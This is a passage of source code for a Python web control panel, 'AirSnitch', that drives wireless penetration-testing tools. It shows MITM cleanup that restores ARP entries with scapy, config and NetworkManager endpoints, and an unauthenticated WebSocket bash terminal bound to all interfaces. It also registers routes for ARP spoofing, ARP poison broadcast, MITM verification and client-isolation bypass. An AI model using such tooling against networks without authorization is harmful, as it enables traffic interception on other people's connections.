        cleanup_log.append("iptables MASQUERADE was already removed")

    # Step 3: Send corrective ARP to restore real gateway MAC (if we know the gateway)
    if gateway and re.match(r'^\d+\.\d+\.\d+\.\d+$', gateway):
        # Resolve real gateway MAC via arping
        rc, arp_out = run(f"arping -c 1 -I {iface} {gateway} 2>/dev/null", timeout=5)
        real_gw_mac = ""
        for line in arp_out.splitlines():
            # arping output: "Unicast reply from 192.168.1.1 [AA:BB:CC:DD:EE:FF] ..."
            if "[" in line and "]" in line:
                real_gw_mac = line.split("[")[1].split("]")[0]
                break

        if real_gw_mac:
            # Send corrective broadcast ARP: "gateway is-at real_gw_mac"
            restore_script = (
                "from scapy.all import *; "
                f"p = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, "
                f"psrc='{gateway}', hwsrc='{real_gw_mac}', "
                f"pdst='255.255.255.255', hwdst='ff:ff:ff:ff:ff:ff'); "
                f"sendp(p, iface='{iface}', count=5, inter=0.2, verbose=False)"
            )
            cmd = (f"cd {AIRSNITCH_DIR} && . venv/bin/activate && "
                   f'python3 -c "{restore_script}" 2>&1')
            rc, _ = await async_run(cmd, timeout=15)
            cleanup_log.append(f"ARP restored: {gateway} is-at {real_gw_mac} (5 packets)")
        else:
            cleanup_log.append(f"Could not resolve real gateway MAC for {gateway} — clients will recover via ARP timeout")
    else:
        cleanup_log.append("No gateway specified — skipped ARP restore")

    # Step 4: Kill any lingering tcpdump
    run(f"pkill -f 'tcpdump.*{iface}' 2>/dev/null", timeout=3)

    append_log(f"[mitm-stop] Cleanup: {'; '.join(cleanup_log)}")
    return web.json_response({
        "message": "MITM attack stopped and cleaned up",
        "cleanup": cleanup_log,
    })


# ── REST API: Configuration ──────────────────────────────────────────────────

async def api_config_load(request):
    content = ""
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r") as f:
            content = f.read()
    return web.json_response({"content": content})


async def api_config_save(request):
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON body"}, status=400)
    content = body.get("content", "")
    if not content.strip():
        return web.json_response({"error": "Config content is empty"}, status=400)
    try:
        os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(CONFIG_PATH, "w") as f:
            f.write(content)
    except PermissionError:
        return web.json_response({"error": f"Permission denied writing {CONFIG_PATH}. Run with sudo."}, status=500)
    except Exception as e:
        return web.json_response({"error": f"Failed to write config: {e}"}, status=500)
    log.info(f"Config saved to {CONFIG_PATH}")
    return web.json_response({"message": "Saved"})


async def api_config_example(request):
    content = ""
    if os.path.exists(EXAMPLE_CONFIG):
        with open(EXAMPLE_CONFIG, "r") as f:
            content = f.read()
    return web.json_response({"content": content})

async def api_config_check(request):
    """Check if a valid config exists (has ctrl_interface + victim + attacker blocks)."""
    if not os.path.exists(CONFIG_PATH):
        return web.json_response({"configured": False, "reason": "No config file"})
    with open(CONFIG_PATH, "r") as f:
        content = f.read()
    has_ctrl = "ctrl_interface" in content
    has_victim = 'id_str="victim"' in content
    has_attacker = 'id_str="attacker"' in content
    # Check it's not just the example template with placeholder values
    has_real_ssid = 'ssid="' in content and 'YourNetworkSSID' not in content and 'testnetwork' not in content
    configured = has_ctrl and has_victim and has_attacker and has_real_ssid
    return web.json_response({"configured": configured})

# ── REST API: Logs ───────────────────────────────────────────────────────────

async def api_logs(request):
    return web.json_response({"logs": "\n".join(_process_logs[-500:])})

# ── REST API: Service Status ─────────────────────────────────────────────────

async def api_status(request):
    """Check what's running: NetworkManager status, wireless state, etc."""
    nm_rc, nm_out = run("systemctl is-active NetworkManager 2>/dev/null")
    iw_rc, iw_out = run("iw dev 2>/dev/null | grep Interface | wc -l")
    return web.json_response({
        "network_manager": nm_out.strip(),
        "wireless_count": iw_out.strip(),
        "airsnitch_dir": os.path.isdir(AIRSNITCH_DIR),
    })


async def api_nm_stop(request):
    """Stop NetworkManager to prevent interference with wireless testing."""
    rc, out = run("systemctl stop NetworkManager 2>&1", timeout=10)
    if rc != 0:
        return web.json_response({"error": f"Failed to stop NetworkManager: {out}"}, status=500)
    log.info("NetworkManager stopped")
    append_log("NetworkManager stopped by web UI")
    return web.json_response({"message": "NetworkManager stopped"})


async def api_nm_start(request):
    """Re-enable NetworkManager."""
    rc, out = run("systemctl start NetworkManager 2>&1", timeout=10)
    if rc != 0:
        return web.json_response({"error": f"Failed to start NetworkManager: {out}"}, status=500)
    log.info("NetworkManager started")
    append_log("NetworkManager started by web UI")
    return web.json_response({"message": "NetworkManager started"})

# ── WebSocket Terminal (native PTY) ──────────────────────────────────────────

async def ws_terminal(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    log.info("Terminal WebSocket connected")

    # Fork a real PTY
    master_fd, slave_fd = pty.openpty()
    proc = subprocess.Popen(
        ["/bin/bash"],
        preexec_fn=os.setsid,
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        cwd=AIRSNITCH_DIR,
        env={
            **os.environ,
            "TERM": "xterm-256color",
            "HOME": os.environ.get("HOME", "/root"),
        },
    )
    os.close(slave_fd)

    loop = asyncio.get_event_loop()

    async def read_pty():
        try:
            while True:
                await asyncio.sleep(0.01)
                if select.select([master_fd], [], [], 0)[0]:
                    try:
                        data = os.read(master_fd, 4096)
                        if not data:
                            break
                        await ws.send_str(data.decode("utf-8", errors="replace"))
                    except OSError:
                        break
        except asyncio.CancelledError:
            pass

    reader_task = asyncio.ensure_future(read_pty())

    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                # Handle resize
                try:
                    parsed = json.loads(msg.data)
                    if parsed.get("type") == "resize":
                        cols = parsed.get("cols", 80)
                        rows = parsed.get("rows", 24)
                        import fcntl
                        import termios
                        winsize = struct.pack("HHHH", rows, cols, 0, 0)
                        fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
                        continue
                except (json.JSONDecodeError, TypeError):
                    pass
                # Forward keystrokes
                try:
                    os.write(master_fd, msg.data.encode("utf-8"))
                except OSError:
                    break
            elif msg.type == aiohttp.WSMsgType.ERROR:
                break
    except Exception as e:
        log.error(f"Terminal error: {e}")
    finally:
        reader_task.cancel()
        os.close(master_fd)
        proc.terminate()
        proc.wait()
        log.info("Terminal WebSocket disconnected")

    return ws

# ── Static + Page ────────────────────────────────────────────────────────────

async def handle_index(request):
    return web.FileResponse(os.path.join(PROJECT_DIR, "web", "templates", "index.html"))

# ── App ──────────────────────────────────────────────────────────────────────

@web.middleware
async def no_cache_middleware(request, handler):
    """Prevent browser from caching static assets during development."""
    response = await handler(request)
    if request.path.startswith("/static") or request.path == "/":
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
    return response


def create_app():
    app = web.Application(middlewares=[no_cache_middleware])

    app.router.add_static("/static", os.path.join(PROJECT_DIR, "web", "static"))
    app.router.add_get("/", handle_index)

    # Wireless
    app.router.add_get("/api/interfaces", api_interfaces)
    app.router.add_post("/api/interfaces/mode", api_interface_mode)
    app.router.add_get("/api/rfkill/{action}", api_rfkill)
    app.router.add_post("/api/wifi/scan", api_wifi_scan)

    # USB
    app.router.add_get("/api/usb/devices", api_usb_devices)

    # Pentest (single NIC)
    app.router.add_post("/api/pentest/connect", api_pentest_connect)
    app.router.add_post("/api/pentest/quickconnect", api_pentest_quickconnect)
    app.router.add_post("/api/pentest/disconnect", api_pentest_disconnect)
    app.router.add_post("/api/pentest/retrydhcp", api_pentest_retrydhcp)
    app.router.add_post("/api/pentest/netinfo", api_netinfo)
    app.router.add_post("/api/pentest/quickcheck", api_quickcheck)
    app.router.add_post("/api/pentest/discover", api_discover)
    app.router.add_post("/api/pentest/ping", api_test_ping)
    app.router.add_post("/api/pentest/arping", api_test_arping)
    app.router.add_post("/api/pentest/portscan", api_test_portscan)
    app.router.add_post("/api/pentest/subnetscan", api_test_subnetscan)
    app.router.add_post("/api/pentest/arpspoof", api_test_arpspoof)
    app.router.add_post("/api/pentest/gwprobe", api_test_gwprobe)
    app.router.add_post("/api/pentest/vlanprobe", api_test_vlanprobe)
    app.router.add_post("/api/pentest/dhcpinfo", api_test_dhcpinfo)
    app.router.add_post("/api/pentest/bypass", api_bypass_test)
    app.router.add_post("/api/pentest/gtk-info", api_gtk_info)
    app.router.add_post("/api/pentest/arp-poison-broadcast", api_arp_poison_broadcast)
    app.router.add_post("/api/pentest/mitm-verify", api_mitm_verify)
    app.router.add_post("/api/pentest/mitm-stop", api_mitm_stop)

    # AirSnitch (dual NIC)
    app.router.add_post("/api/airsnitch/run", api_airsnitch_run)

    # Config
    app.router.add_get("/api/config/load", api_config_load)
    app.router.add_post("/api/config/save", api_config_save)
    app.router.add_get("/api/config/example", api_config_example)
    app.router.add_get("/api/config/check", api_config_check)

    # Logs & status
    app.router.add_get("/api/logs", api_logs)
    app.router.add_get("/api/status", api_status)

    # NetworkManager control
    app.router.add_post("/api/nm/stop", api_nm_stop)
    app.router.add_post("/api/nm/start", api_nm_start)

    # Terminal
    app.router.add_get("/ws/terminal", ws_terminal)

    return app


if __name__ == "__main__":
    port = int(os.environ.get("AIRSNITCH_PORT", os.environ.get("PORT", 8080)))
    log.info(f"AirSnitch Control Panel — http://0.0.0.0:{port}")
    web.run_app(create_app(), host="0.0.0.0", port=port)
